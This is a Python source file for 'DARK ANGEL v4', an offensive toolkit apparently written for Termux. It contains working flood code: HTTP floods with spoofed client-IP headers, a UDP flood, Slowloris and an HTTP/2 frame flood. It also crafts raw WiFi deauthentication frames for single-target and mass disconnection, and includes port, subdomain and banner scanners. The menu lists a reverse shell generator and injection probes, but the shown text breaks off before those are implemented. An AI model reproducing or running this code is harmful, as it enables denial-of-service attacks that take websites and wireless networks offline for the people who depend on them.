#!/usr/bin/env python3
# ╔══════════════════════════════════════╗
# ║     DARK ANGEL v4 — ULTRA            ║
# ║  by AR0 · Termux · zero dependency   ║
# ╚══════════════════════════════════════╝

import threading, socket, random, time, os, sys, ssl, struct
import subprocess, re, shutil, hashlib, base64, urllib.request
from urllib.parse import urlparse, urlencode
from collections  import deque

# ════════════════════════════════════
#  ANSI
# ════════════════════════════════════
R ="\033[91m"; DR="\033[31m"; Y ="\033[93m"
G ="\033[92m"; C ="\033[96m"; DC="\033[36m"
B ="\033[94m"; M ="\033[95m"; W ="\033[97m"; GR="\033[90m"
DG="\033[32m"; DY="\033[33m"
BLD="\033[1m"; RST="\033[0m"
HIDE="\033[?25l"; SHOW="\033[?25h"
SP = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
SQ = ["▏","▎","▍","▌","▋","▊","▉","█"]

def strip_ansi(s):
    return re.sub(r'\033\[[0-9;]*m','',s)

# ════════════════════════════════════
#  SCREEN — full clear + cursor reset
# ════════════════════════════════════
def cls():
    # hard clear — wipe semua, cursor ke 0,0
    sys.stdout.write("\033[2J\033[3J\033[H")
    sys.stdout.flush()

def goto(r,c=1):
    return f"\033[{r};{c}H"

def vinp(prompt):
    sys.stdout.write(SHOW)
    try:    v=input(f"\n  {DC}❯{GR}─ {W}{prompt}{GR} :{RST} ")
    except: v=""
    sys.stdout.write(HIDE)
    return v.strip()

# ════════════════════════════════════
#  BOX — fixed BW=44
# ════════════════════════════════════
BW=44

def b_top(title="",color=DR):
    t=f" {Y}{BLD}{title}{RST}{color} " if title else ""
    fill=BW-len(strip_ansi(t))
    return f"{color}╔{t}{'═'*max(fill,0)}╗{RST}"

def b_mid(color=DR):
    return f"{color}╠{'═'*BW}╣{RST}"

def b_sep(color=DR):
    return f"{color}╟{'─'*BW}╢{RST}"

def b_bot(color=DR):
    return f"{color}╚{'═'*BW}╝{RST}"

def b_row(content,color=DR):
    vis=len(strip_ansi(content))
    pad=max(BW-vis,0)
    return f"{color}║{RST}{content}{' '*pad}{color}║{RST}"

# ════════════════════════════════════
#  SMOOTH BAR
# ════════════════════════════════════
BAR_W=20

def sbar(val,mx,fc=G,ec=GR):
    pct=min(val/max(float(mx),1.0),1.0)
    total=pct*BAR_W
    full=int(total); frac=total-full
    sub=SQ[int(frac*8)] if frac>0.05 else ""
    sc=fc if frac>0.05 else ""
    empty=BAR_W-full-(1 if sub else 0)
    return f"{fc}{'█'*full}{sc}{sub}{ec}{'░'*max(empty,0)}{RST}"

# ════════════════════════════════════
#  BATMAN ICON
# ════════════════════════════════════
ICON=[
f"{GR}────────────────────────────────────────{RST}",
f"{DR}─────────────▄▄{R}██████████{DR}▄▄─────────────{RST}",
f"{DR}─────────────{GR}▀▀▀{DR}───{R}██{DR}───{GR}▀▀▀{DR}─────────────{RST}",
f"{DR}─────▄{R}██{DR}▄───▄▄{R}████████████{DR}▄▄───▄{R}██{DR}▄─────{RST}",
f"{DR}───▄{R}███{DR}▀──▄{R}████{GR}▀▀▀────▀▀▀{R}████{DR}▄──▀{R}███{DR}▄───{RST}",
f"{DR}──{R}████{DR}▄─▄{R}███{DR}▀──────────────▀{R}███{DR}▄─▄{R}████{DR}──{RST}",
f"{DR}─{R}███{DR}▀{R}█████{DR}▀▄{R}████{DR}▄──────▄{R}████{DR}▄▀{R}█████{DR}▀{R}███{DR}─{RST}",
f"{DR}─{R}██{DR}▀──{R}███{DR}▀─{R}██████{DR}──────{R}██████{DR}─▀{R}███{DR}──▀{R}██{DR}─{RST}",
f"{DR}──▀──▄{R}██{DR}▀──▀{R}████{DR}▀──▄▄──▀{R}████{DR}▀──▀{R}██{DR}▄──▀──{RST}",
f"{DR}─────{R}███{DR}───────────{Y}▀▀{DR}───────────{R}███{DR}─────{RST}",
f"{DR}─────{R}██████████████████████████████{DR}─────{RST}",
f"{DR}─▄{R}█{DR}──▀{R}██{DR}──{R}███{DR}───{R}██{DR}────{R}██{DR}───{R}███{DR}──{R}██{DR}▀──{R}█{DR}▄─{RST}",
f"{DR}─{R}███{DR}──{R}███{DR}─{R}███{DR}───{R}██{DR}────{R}██{DR}───{R}███{DR}▄{R}███{DR}──{R}███{DR}─{RST}",
f"{DR}─▀{R}██{DR}▄{R}████████{DR}───{R}██{DR}────{R}██{DR}───{R}████████{DR}▄{R}██{DR}▀─{RST}",
f"{DR}──▀{R}███{DR}▀─▀{R}████{DR}───{R}██{DR}────{R}██{DR}───{R}████{DR}▀─▀{R}███{DR}▀──{RST}",
f"{DR}───▀{R}███{DR}▄──▀{R}███████{DR}────{R}███████{DR}▀──▄{R}███{DR}▀───{RST}",
f"{DR}─────▀{R}███{DR}────▀▀{R}██████████{DR}▀▀▀───{R}███{DR}▀─────{RST}",
f"{DR}───────▀─────▄▄▄───{R}██{DR}───▄▄▄──────▀───────{RST}",
f"{DR}────────────{GR}▀▀{DR}███████████{GR}▀▀{DR}────────────{RST}",
f"{GR}────────────────────────────────────────{RST}",
f"  {GR}  {W}{BLD}D A R K   A N G E L{RST}  {DR}v4 ULTRA{GR}  {W}by AR0{RST}",
f"",
]
ICON_LINES=len(ICON)

def print_icon():
    # selalu cls dulu sebelum print icon — fix ghost lines
    cls()
    for l in ICON: print(l)

# ════════════════════════════════════
#  WELCOME
# ════════════════════════════════════
def welcome():
    print_icon()
    phases=[
        ("Payload engine  ",DR,R),
        ("Flood modules   ",R, Y),
        ("WiFi killer     ",Y, G),
        ("Exploit toolkit ",G, C),
        ("Arming systems  ",C, M),
    ]
    for txt,c1,c2 in phases:
        for i in range(BAR_W+1):
            b=sbar(i,BAR_W,c2,GR)
            sys.stdout.write(
                f"\r  {c1}⟫{RST} {GR}{txt}{RST} {b} {W}{int(i/BAR_W*100):>3}%{RST}   "
            )
            sys.stdout.flush()
            time.sleep(0.02)
        print()
    time.sleep(0.2)

# ════════════════════════════════════
#  MENUS
# ════════════════════════════════════
def menu():
    print_icon()
    rows=[]
    rows.append(b_top("DARK ANGEL v4  ─  MAIN MENU"))
    rows.append(b_sep())
    rows.append(b_row(f"  {DR}◉ {Y}{BLD}FLOOD ENGINE{RST}"))
    flood_items=[
        ("1","HTTP Flood",  "GET/POST keep-alive",   C),
        ("2","UDP  Flood",  "raw socket payload",    Y),
        ("3","Slowloris",   "conn slot exhaustion",  M),
        ("4","HTTP/2",      "H2 frame hammer",       B),
        ("5","Combo",       "HTTP + UDP parallel",   R),
    ]
    for k,name,desc,color in flood_items:
        rows.append(b_row(f"  {G}[{BLD}{k}{RST}{G}]{RST} {color}{name:<13}{RST}{GR} {desc}"))
    rows.append(b_sep())
    rows.append(b_row(f"  {DR}◉ {Y}{BLD}WIFI KILLER{RST}"))
    wifi_items=[
        ("6","Scan WiFi",  "lihat AP sekitar",     DC),
        ("7","WiFi Killer","deauth 1 target",        Y),
        ("8","Mass Deauth","broadcast all device",   R),
    ]
    for k,name,desc,color in wifi_items:
        rows.append(b_row(f"  {Y}[{BLD}{k}{RST}{Y}]{RST} {color}{name:<13}{RST}{GR} {desc}"))
    rows.append(b_sep())
    rows.append(b_row(f"  {DR}◉ {Y}{BLD}NETWORK TOOLS{RST}"))
    net_items=[
        ("9", "Port Scanner",  "scan port TCP target",   C),
        ("10","DNS Lookup",    "resolve + record dump",  DC),
        ("11","Subdomain Scan","bruteforce subdomain",   M),
        ("12","Banner Grab",   "service fingerprint",    G),
        ("13","Ping Sweep",    "ICMP sweep /24 range",   Y),
    ]
    for k,name,desc,color in net_items:
        rows.append(b_row(f"  {C}[{BLD}{k:>2}{RST}{C}]{RST} {color}{name:<13}{RST}{GR} {desc}"))
    rows.append(b_sep())
    rows.append(b_row(f"  {DR}◉ {Y}{BLD}EXPLOIT TOOLKIT{RST}"))
    exp_items=[
        ("14","Payload Gen",  "reverse shell generator", R),
        ("15","SQLi Tester",  "error+blind SQLi probe",  R),
        ("16","Dir Buster",   "hidden path bruteforce",  Y),
        ("17","LFI Probe",    "path traversal tester",   M),
        ("18","Header Scan",  "security header audit",   C),
        ("19","Cookie Grab",  "dump Set-Cookie headers", Y),
        ("20","SSRF Probe",   "server side req test",    B),
    ]
    for k,name,desc,color in exp_items:
        rows.append(b_row(f"  {R}[{BLD}{k:>2}{RST}{R}]{RST} {color}{name:<13}{RST}{GR} {desc}"))
    rows.append(b_sep())
    rows.append(b_row(f"  {DR}◉ {Y}{BLD}CRYPTO / ENCODE{RST}"))
    cry_items=[
        ("21","Hash Crack",   "MD5/SHA wordlist crack",  Y),
        ("22","Base64",       "encode / decode",         G),
        ("23","Hash Gen",     "MD5/SHA1/SHA256 gen",     C),
        ("24","XOR Cipher",   "xor string with key",     M),
    ]
    for k,name,desc,color in cry_items:
        rows.append(b_row(f"  {M}[{BLD}{k:>2}{RST}{M}]{RST} {color}{name:<13}{RST}{GR} {desc}"))
    rows.append(b_sep())
    rows.append(b_row(f"  {R}[{BLD} 0{RST}{R}]{RST} {W}Keluar"))
    rows.append(b_bot())
    print("\n".join(rows))
    return vinp("Pilih")

# ════════════════════════════════════
#  SHARED FLOOD STATE
# ════════════════════════════════════
stop_ev=threading.Event()
_lk=threading.Lock()
ST={"sent":0,"errors":0,"active":0,"bytes":0,"conn":0}
_rpsq=deque(maxlen=6)

def reset_st():
    with _lk:
        for k in ST: ST[k]=0
    _rpsq.clear()
    stop_ev.clear()

# ════════════════════════════════════
#  PAYLOAD BUILDERS
# ════════════════════════════════════
UA=[
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 14; SM-A155F) Chrome/124.0 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4) Mobile/15E148",
"Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"curl/8.6.0","python-httpx/0.27.0","Go-http-client/2.0",
]
REF=["https://www.google.com/","https://www.bing.com/",
     "https://t.co/","https://duckduckgo.com/"]
PATHS=["/","/index.php","/api/v1","/login","/admin",
       "/search","/sitemap.xml","/cdn-cgi/trace"]

def rip():
    return ".".join(str(random.randint(1,254)) for _ in range(4))

_sslctx=ssl.create_default_context()
_sslctx.check_hostname=False
_sslctx.verify_mode=ssl.CERT_NONE
try: _sslctx.set_ciphers("ALL:@SECLEVEL=0")
except: pass

def build_get(host,path):
    return (
        f"GET {path}?_={random.randint(10**8,10**9)}&t={int(time.time())} HTTP/1.1\r\n"
        f"Host: {host}\r\nUser-Agent: {random.choice(UA)}\r\n"
        f"Referer: {random.choice(REF)}\r\n"
        f"X-Forwarded-For: {rip()}\r\nX-Real-IP: {rip()}\r\n"
        f"CF-Connecting-IP: {rip()}\r\nTrue-Client-IP: {rip()}\r\n"
        f"Accept: text/html,*/*;q=0.8\r\nAccept-Encoding: gzip,deflate,br\r\n"
        f"Accept-Language: en-US,en;q=0.9,id;q=0.8\r\n"
        f"Connection: keep-alive\r\nCache-Control: no-cache,no-store\r\n\r\n"
    ).encode()

def build_post(host,path):
    bd="&".join(
        f"f{i}={''.join(random.choices('abcdefghijklmnopqrstuvwxyz',k=random.randint(8,48)))}"
        for i in range(random.randint(5,12))
    )
    return (
        f"POST {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(UA)}\r\n"
        f"X-Forwarded-For: {rip()}\r\nX-Real-IP: {rip()}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(bd)}\r\nConnection: keep-alive\r\n\r\n{bd}"
    ).encode()

# ════════════════════════════════════
#  FLOOD WORKERS
# ════════════════════════════════════
def http_worker(host,port,path,method,ssl_on):
    with _lk: ST["active"]+=1
    while not stop_ev.is_set():
        s=None
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY,1)
            s.settimeout(4)
            if ssl_on: s=_sslctx.wrap_socket(s,server_hostname=host)
            s.connect((host,port))
            with _lk: ST["conn"]+=1
            for _ in range(random.randint(12,35)):
                if stop_ev.is_set(): break
                req=build_get(host,random.choice(PATHS)) if method=="GET" \
                    else build_post(host,random.choice(PATHS))
                s.sendall(req)
                with _lk: ST["sent"]+=1; ST["bytes"]+=len(req)
                try: s.recv(4096)
                except: pass
            s.close()
        except:
            with _lk: ST["errors"]+=1
            try:
                if s: s.close()
            except: pass
    with _lk: ST["active"]-=1

def udp_worker(host,port,psize):
    try:    ip=socket.gethostbyname(host)
    except: return
    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET,socket.SO_SNDBUF,65536)
    with _lk: ST["active"]+=1
    while not stop_ev.is_set():
        try:
            sz=random.randint(max(64,psize-256),psize+256)
            s.sendto(random._urandom(sz),(ip,port))
            with _lk: ST["sent"]+=1; ST["bytes"]+=sz
        except:
            with _lk: ST["errors"]+=1
    with _lk: ST["active"]-=1

def slow_worker(host,port,ssl_on):
    with _lk: ST["active"]+=1
    socks=[]; MAX=150
    while not stop_ev.is_set():
        while len(socks)<MAX and not stop_ev.is_set():
            try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.settimeout(8)
                if ssl_on: s=_sslctx.wrap_socket(s,server_hostname=host)
                s.connect((host,port))
                s.send((
                    f"GET /?{random.randint(0,9999999)} HTTP/1.1\r\n"
                    f"Host: {host}\r\nUser-Agent: {random.choice(UA)}\r\n"
                    f"X-Forwarded-For: {rip()}\r\n"
                ).encode())
                socks.append(s)
            except: break
        dead=[]
        for s in socks:
            try:
                s.send(f"X-K{random.randint(100,999)}: {random.randint(1,99999)}\r\n".encode())
                with _lk: ST["sent"]+=1
            except:
                dead.append(s)
                with _lk: ST["errors"]+=1
        for s in dead: socks.remove(s)
        with _lk: ST["conn"]=len(socks)
        time.sleep(8)
    for s in socks:
        try: s.close()
        except: pass
    with _lk: ST["active"]-=1

def h2_worker(host,port,path,ssl_on):
    with _lk: ST["active"]+=1
    PF=b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
    SET=b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
    HDR=b"\x82\x84\x86\x41\x8a\x08\x9d\x5c\x0b\x81\x70\xdc\x78\xff"
    while not stop_ev.is_set():
        s=None
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(5)
            if ssl_on: s=_sslctx.wrap_socket(s,server_hostname=host)
            s.connect((host,port))
            s.sendall(PF+SET)
            for _ in range(80):
                if stop_ev.is_set(): break
                sid=(random.randint(1,0x7fffffff)|1)
                frm=struct.pack(">I",len(HDR))[1:]+b"\x01\x05"+struct.pack(">I",sid)+HDR
                s.sendall(frm)
                with _lk: ST["sent"]+=1; ST["bytes"]+=len(frm)
            s.close()
        except:
            with _lk: ST["errors"]+=1
            try:
                if s: s.close()
            except: pass
    with _lk: ST["active"]-=1

# ════════════════════════════════════
#  FLOOD DASHBOARD
# ════════════════════════════════════
MC={"HTTP Flood":C,"UDP  Flood":Y,"Slowloris":M,"HTTP/2":B,"Combo":R}

def flood_dash(cfg,host,port):
    sp_i=0; prev_s=0; prev_t=time.time(); start=time.time()
    sys.stdout.write(HIDE)
    # tulis icon sekali
    print_icon()
    DASH_ROW=ICON_LINES+1
    mc=MC.get(cfg["mode"],W)
    try:
        while not stop_ev.is_set():
            now=time.time(); el=now-start; dt=now-prev_t
            with _lk:
                sent=ST["sent"]; err=ST["errors"]
                act=ST["active"]; byt=ST["bytes"]; conn=ST["conn"]
            rps=(sent-prev_s)/max(dt,0.01)
            prev_s=sent; prev_t=now
            _rpsq.append(rps)
            avg=sum(_rpsq)/len(_rpsq)
            mbps=(byt*8)/max(el,1)/1_000_000
            upt=f"{int(el//3600):02d}:{int((el%3600)//60):02d}:{int(el%60):02d}"
            sp=SP[sp_i%len(SP)]; sp_i+=1
            ep=err/max(sent,1)*100
            rc=G if avg<600 else (Y if avg<1500 else R)
            ec=G if ep<5   else (Y if ep<25    else R)

            def mrow(lbl,bv,bm,bc,vs,vc):
                return b_row(f"  {GR}├ {DC}{lbl:<10}{GR}: {sbar(bv,bm,bc)} {vc}{vs}{RST}")

            buf=[goto(DASH_ROW)]
            buf.append(b_top("DARK ANGEL  ─  FLOOD ENGINE")+"\n")
            buf.append(b_row(f"  {C}{sp}  {G}{BLD}ATTACKING{RST}  {GR}· uptime {C}{BLD}{upt}{RST}")+"\n")
            buf.append(b_sep()+"\n")
            buf.append(b_row(f"  {DR}◉ {Y}{BLD}TARGET{RST}")+"\n")
            buf.append(b_row(f"  {GR}├ {DC}Host    {GR}: {W}{host[:26]}{RST}")+"\n")
            buf.append(b_row(f"  {GR}├ {DC}Port    {GR}: {W}{port}{RST}")+"\n")
            buf.append(b_row(f"  {GR}├ {DC}Mode    {GR}: {mc}{cfg['mode']}{RST}")+"\n")
            buf.append(b_row(f"  {GR}├ {DC}Threads {GR}: {M}{cfg['threads']}{RST}")+"\n")
            dur_s=f"{cfg['duration']}s" if cfg['duration'] else "∞"
            buf.append(b_row(f"  {GR}╰ {DC}Durasi  {GR}: {W}{dur_s}{RST}")+"\n")
            buf.append(b_sep()+"\n")
            buf.append(b_row(f"  {DR}◉ {Y}{BLD}LIVE STATS{RST}")+"\n")
            buf.append(b_row(f"  {GR}├ {G}↑ {DC}Sent      {GR}: {G}{sent:>12,}{RST}")+"\n")
            buf.append(b_row(f"  {GR}├ {ec}✗ {DC}Errors    {GR}: {ec}{err:>12,}{RST}")+"\n")
            buf.append(b_row(f"  {GR}├ {ec}⚡{DC}Err Rate  {GR}: {ec}{ep:>10.1f}%{RST}")+"\n")
            buf.append(b_row(f"  {GR}├ {M}◎ {DC}Active Thr{GR}: {M}{act:>12}{RST}")+"\n")
            buf.append(b_row(f"  {GR}├ {C}⊕ {DC}Open Conn {GR}: {C}{conn:>12}{RST}")+"\n")
            buf.append(b_row(f"  {GR}╰ {B}≋ {DC}Bandwidth {GR}: {B}{mbps:>9.2f} Mbps{RST}")+"\n")
            buf.append(b_sep()+"\n")
            buf.append(b_row(f"  {DR}◉ {Y}{BLD}METERS{RST}")+"\n")
            buf.append(mrow("RPS",     avg,   2000, rc, f"{avg:>5.0f}/s",rc)+"\n")
            buf.append(mrow("Error%",  ep,    100,  ec, f"{ep:>4.1f}%",  ec)+"\n")
            buf.append(mrow("Sent",    min(sent,500000),500000,C,f"{sent:>7,}",C)+"\n")
            buf.append(mrow("BW",      mbps,  200,  B,  f"{mbps:>4.1f}M",B)+"\n")
            buf.append(b_bot()+"\n")
            buf.append(f"  {GR}Ctrl+C → stop · {mc}{cfg['mode']}{GR} · {Y}{SP[(sp_i+2)%10]}{RST}\n")
            buf.append("\033[J")
            sys.stdout.write("".join(buf))
            sys.stdout.flush()
            time.sleep(1.0)
    except KeyboardInterrupt:
        stop_ev.set()
    sys.stdout.write(SHOW)

# ════════════════════════════════════
#  WIFI KILLER
# ════════════════════════════════════
wifi_stop=threading.Event()
wst={"sent":0,"target":"","iface":"","ch":"6"}

def check_root():  return os.geteuid()==0
def check_dep(c):  return subprocess.run(["which",c],capture_output=True).returncode==0

def get_ifaces():
    try:
        out=subprocess.check_output(["ip","link","show"],text=True)
        return [l.split(":")[1].strip()
                for l in out.splitlines()
                if l[0].isdigit() and "lo" not in l]
    except: return []

def set_monitor(iface,on=True):
    mode="monitor" if on else "managed"
    try:
        subprocess.run(["ip","link","set",iface,"down"],capture_output=True)
        subprocess.run(["iw","dev",iface,"set","type",mode],capture_output=True)
        subprocess.run(["ip","link","set",iface,"up"],capture_output=True)
        return True
    except: return False

def scan_aps(iface):
    try:
        out=subprocess.check_output(
            ["iw","dev",iface,"scan"],
            text=True,stderr=subprocess.DEVNULL,timeout=15)
        aps=[]; cur={}
        for l in out.splitlines():
            l=l.strip()
            if l.startswith("BSS "):
                if cur: aps.append(cur)
                cur={"bssid":l.split()[1].split("(")[0],"ssid":"?","ch":"?","sig":"?"}
            elif "SSID:" in l:
                cur["ssid"]=l.split("SSID:")[1].strip() or "<hidden>"
            elif "DS Parameter set: channel" in l:
                cur["ch"]=l.split("channel")[1].strip()
            elif "signal:" in l:
                cur["sig"]=l.split("signal:")[1].strip()
        if cur: aps.append(cur)
        return aps
    except: return []

def mac2b(mac):
    return bytes(int(x,16) for x in mac.strip().split(":"))

def build_deauth(bb,cb,reason=7):
    fc=b"\xc0\x00"; dur=b"\x00\x00"
    seq=struct.pack("<H",random.randint(0,4095)<<4)
    rsn=struct.pack("<H",reason)
    return (fc+dur+cb+bb+bb+seq+rsn,
            fc+dur+b"\xff\xff\xff\xff\xff\xff"+bb+bb+seq+rsn)

def deauth_loop(iface,bssid,client,ch):
    wifi_stop.clear(); wst["sent"]=0
    wst.update({"target":bssid,"iface":iface,"ch":ch})
    try: subprocess.run(["iw","dev",iface,"set","channel",ch],capture_output=True)
    except: pass
    try:
        s=socket.socket(socket.AF_PACKET,socket.SOCK_RAW,socket.htons(0x0003))
        s.bind((iface,0))
    except Exception as e:
        print(f"\n  {R}✗ Raw socket: {e}{RST}"); return
    bb=mac2b(bssid); cb=mac2b(client)
    while not wifi_stop.is_set():
        try:
            f1,f2=build_deauth(bb,cb)
            s.send(f1); s.send(f2); wst["sent"]+=2
        except: pass
    s.close()

def wifi_dash(label,iface,bssid,client,ch):
    sp_i=0; start=time.time()
    sys.stdout.write(HIDE)
    print_icon()
    DASH_ROW=ICON_LINES+1
    try:
        while True:
            el=time.time()-start
            upt=f"{int(el//60):02d}:{int(el%60):02d}"
            sp=SP[sp_i%len(SP)]; sp_i+=1
            dps=wst["sent"]/max(el,1)
            ib=sbar(min(wst["sent"],100000),100000,R)
            buf=[goto(DASH_ROW)]
            buf.append(b_top(f"DARK ANGEL  ─  {label}")+"\n")
            buf.append(b_row(f"  {R}{sp}  {R}{BLD}TRANSMITTING{RST}  {GR}· {C}{upt}{RST}")+"\n")
            buf.append(b_sep()+"\n")
            buf.append(b_row(f"  {DR}◉ {Y}{BLD}CONFIG{RST}")+"\n")
            buf.append(b_row(f"  {GR}├ {DC}Interface {GR}: {W}{iface}{RST}")+"\n")
            buf.append(b_row(f"  {GR}├ {DC}Target AP {GR}: {R}{bssid}{RST}")+"\n")
            buf.append(b_row(f"  {GR}├ {DC}Client    {GR}: {Y}{client}{RST}")+"\n")
            buf.append(b_row(f"  {GR}╰ {DC}Channel   {GR}: {W}{ch}{RST}")+"\n")
            buf.append(b_sep()+"\n")
            buf.append(b_row(f"  {GR}├ {G}↑ {DC}Frames   {GR}: {G}{wst['sent']:>10,}{RST}")+"\n")
            buf.append(b_row(f"  {GR}╰ {R}⚡{DC}Deauth/s {GR}: {R}{dps:>10.1f}{RST}")+"\n")
            buf.append(b_sep()+"\n")
            buf.append(b_row(f"  {GR}╰ {DC}Power     {GR}: {ib} {R}{wst['sent']:,}{RST}")+"\n")
            buf.append(b_bot()+"\n")
            buf.append(f"  {GR}Ctrl+C → stop{RST}\n\033[J")
            sys.stdout.write("".join(buf))
            sys.stdout.flush()
            time.sleep(1.0)
    except KeyboardInterrupt:
        wifi_stop.set()
    sys.stdout.write(SHOW)

def pick_iface():
    ifaces=get_ifaces()
    if not ifaces: print(f"  {R}✗ Tidak ada interface.{RST}"); return None
    for i,f in enumerate(ifaces): print(f"  {G}[{i}]{W} {f}{RST}")
    idx=vinp("Pilih interface")
    try:    return ifaces[int(idx)]
    except: return ifaces[0]

def do_scan():
    print_icon()
    if not check_root(): print(f"  {R}✗ Butuh root{RST}"); vinp("ENTER..."); return
    if not check_dep("iw"): print(f"  {R}✗ pkg install iw{RST}"); vinp("ENTER..."); return
    iface=pick_iface()
    if not iface: return
    print(f"\n  {Y}Scanning {W}{iface}{Y}...{RST}\n")
    set_monitor(iface,True); aps=scan_aps(iface); set_monitor(iface,False)
    if not aps: print(f"  {R}✗ Tidak ada AP.{RST}"); vinp("ENTER..."); return
    rows=[b_top("WIFI SCAN RESULT")]
    rows.append(b_row(f"  {GR}# {DC}{'BSSID':<19}{Y}{'SSID':<14}{G}CH  {C}SIG"))
    rows.append(b_mid())
    for i,ap in enumerate(aps):
        cc=W if i%2==0 else GR
        rows.append(b_row(f"  {G}{i:<2} {cc}{ap['bssid']:<18} {Y}{ap['ssid'][:13]:<13} {G}{ap['ch']:<4}{C}{ap['sig']}"))
    rows.append(b_bot()); print("\n".join(rows)); vinp("ENTER...")

def do_killer(mass=False):
    print_icon()
    label="MASS DEAUTH" if mass else "WiFi KILLER"
    if not check_root(): print(f"  {R}✗ Butuh root{RST}"); vinp("ENTER..."); return
    if not check_dep("iw"): print(f"  {R}✗ pkg install iw{RST}"); vinp("ENTER..."); return
    iface=pick_iface()
    if not iface: return
    bssid=vinp("BSSID target (AA:BB:CC:DD:EE:FF)")
    if len(bssid.split(":"))<6: print(f"  {R}✗ Format MAC salah{RST}"); vinp("ENTER..."); return
    client="FF:FF:FF:FF:FF:FF"
    if not mass:
        c=vinp("Client MAC (ENTER=broadcast)")
        if c: client=c
    ch=vinp("Channel (default 6)") or "6"
    if not set_monitor(iface,True): print(f"  {R}✗ Gagal monitor mode{RST}"); vinp("ENTER..."); return
    t=threading.Thread(target=deauth_loop,args=(iface,bssid,client,ch),daemon=True)
    t.start()
    wifi_dash(label,iface,bssid,client,ch)
    set_monitor(iface,False)
    print_icon()
    print(f"\n  {G}✓ Selesai — frames: {wst['sent']:,}{RST}\n")
    vinp("ENTER...")

# ════════════════════════════════════
#  NETWORK TOOLS
# ════════════════════════════════════
def do_port_scan():
    print_icon()
    print(b_top("PORT SCANNER")+"\n"+b_bot()+"\n")
    host=vinp("Target host/IP")
    ports_in=vinp("Port range (misal 1-1024 atau 80,443,8080)")
    timeout=float(vinp("Timeout detik (default 0.5)") or "0.5")
    try: ip=socket.gethostbyname(host)
    except: print(f"  {R}✗ Resolve gagal{RST}"); vinp("ENTER..."); return

    ports=[]
    if "-" in ports_in:
        a,b_=ports_in.split("-",1)
        ports=list(range(int(a),int(b_)+1))
    elif "," in ports_in:
        ports=[int(x) for x in ports_in.split(",")]
    else:
        ports=list(range(1,1025))

    print(f"\n  {Y}Scanning {W}{host}{Y} ({ip}) — {len(ports)} ports...{RST}\n")
    open_ports=[]; lock=threading.Lock()

    def scan_port(p):
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(timeout)
            if s.connect_ex((ip,p))==0:
                try:
                    banner=s.recv(64).decode(errors="ignore").strip()
                except: banner=""
                with lock: open_ports.append((p,banner))
            s.close()
        except: pass

    threads=[threading.Thread(target=scan_port,args=(p,),daemon=True) for p in ports]
    for t in threads: t.start()
    for t in threads: t.join()

    open_ports.sort()
    rows=[b_top(f"OPEN PORTS — {host}")]
    if not open_ports:
        rows.append(b_row(f"  {R}Tidak ada port terbuka.{RST}"))
    for p,banner in open_ports:
        b_=banner[:25] if banner else ""
        rows.append(b_row(f"  {G}◉ {W}{p:<6}{GR} {b_}{RST}"))
    rows.append(b_bot()); print("\n".join(rows)); vinp("ENTER...")

def do_dns():
    print_icon()
    print(b_top("DNS LOOKUP")+"\n"+b_bot()+"\n")
    host=vinp("Target domain")
    rows=[b_top(f"DNS — {host}")]
    # A record
    try:
        ips=socket.getaddrinfo(host,None)
        seen=set()
        for r in ips:
            ip=r[4][0]
            if ip not in seen:
                seen.add(ip)
                rows.append(b_row(f"  {G}A    {W}{ip}{RST}"))
    except: rows.append(b_row(f"  {R}A lookup gagal{RST}"))
    # MX via nslookup
    for rtype in ["MX","NS","TXT"]:
        try:
            out=subprocess.check_output(
                ["nslookup",f"-type={rtype}",host],
                text=True,stderr=subprocess.DEVNULL,timeout=5)
            for l in out.splitlines():
                if rtype in l or "=" in l:
                    rows.append(b_row(f"  {Y}{rtype:<5}{GR}{l.strip()[:36]}{RST}"))
        except: pass
    rows.append(b_bot()); print("\n".join(rows)); vinp("ENTER...")

SUBS=["www","mail","ftp","cpanel","webmail","admin","api","dev","test",
      "staging","blog","shop","app","m","ns1","ns2","smtp","pop","imap",
      "vpn","ssh","db","mysql","redis","git","cdn","static","media"]

def do_subdomain():
    print_icon()
    print(b_top("SUBDOMAIN SCANNER")+"\n"+b_bot()+"\n")
    domain=vinp("Target domain (contoh: target.com)")
    custom=vinp("Wordlist custom (ENTER=default)")
    words=SUBS if not custom else [x.strip() for x in custom.split(",")]
    print(f"\n  {Y}Scanning {len(words)} subdomain...{RST}\n")
    found=[]; lock=threading.Lock()
    def check(sub):
        try:
            ip=socket.gethostbyname(f"{sub}.{domain}")
            with lock: found.append((sub,ip))
        except: pass
    threads=[threading.Thread(target=check,args=(s,),daemon=True) for s in words]
    for t in threads: t.start()
    for t in threads: t.join()
    rows=[b_top(f"SUBDOMAIN — {domain}")]
    if not found: rows.append(b_row(f"  {R}Tidak ada subdomain ditemukan.{RST}"))
    for sub,ip in sorted(found):
        rows.append(b_row(f"  {G}◉ {C}{sub}.{domain:<25}{GR} {ip}{RST}"))
    rows.append(b_bot()); print("\n".join(rows)); vinp("ENTER...")

def do_banner():
    print_icon()
    print(b_top("BANNER GRABBER")+"\n"+b_bot()+"\n")
    host=vinp("Host/IP")
    port=int(vinp("Port (default 80)") or "80")
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(5); s.connect((host,port))
        s.send(f"HEAD / HTTP/1.0\r\nHost: {host}\r\n\r\n".encode())
        data=s.recv(2048).decode(errors="ignore"); s.close()
        rows=[b_top(f"BANNER — {host}:{port}")]
        for l in data.splitlines()[:20]:
            if l.strip():
                rows.append(b_row(f"  {GR}{l[:42]}{RST}"))
        rows.append(b_bot()); print("\n".join(rows))
    except Exception as e:
